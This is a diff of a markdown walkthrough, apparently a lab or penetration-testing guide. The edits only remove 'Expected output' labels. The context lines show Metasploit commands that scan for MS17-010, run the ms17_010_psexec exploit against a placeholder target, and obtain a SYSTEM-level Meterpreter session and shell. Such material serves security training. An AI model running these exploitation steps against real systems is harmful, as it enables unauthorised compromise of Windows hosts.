@@ -307,9 +307,6 @@ msf6 > show options
 msf6 > set RHOSTS <TARGET IP>
 msf6 > run
 ```
-
-Expected output  
-
 ```bash
 # [msf](Jobs:0 Agents:0) auxiliary(scanner/smb/smb_ms17_010) >> run
 
@@ -337,9 +334,6 @@ Based on prior success rates with the PsExec variant, we'll prioritize this expl
 ```bash
 msf6 > run
 ```
-
-Expected output  
-
 ```bash
 # [msf](Jobs:0 Agents:0) exploit(windows/smb/ms17_010_psexec) >> run
 
@@ -363,9 +357,6 @@ With an active Meterpreter session established (indicated by the meterpreter > p
 ```bash
 getuid
 ```
-
-Expected output  
-
 ```bash
 # Server username: NT AUTHORITY\SYSTEM
 ```
@@ -377,9 +368,6 @@ From here, we can utilize Meterpreter to run further commands to gather system i
 ```bash
 shell
 ```
-
-Expected output  
-
 ```bash
 # Process 4844 created.
 # Channel 1 created.
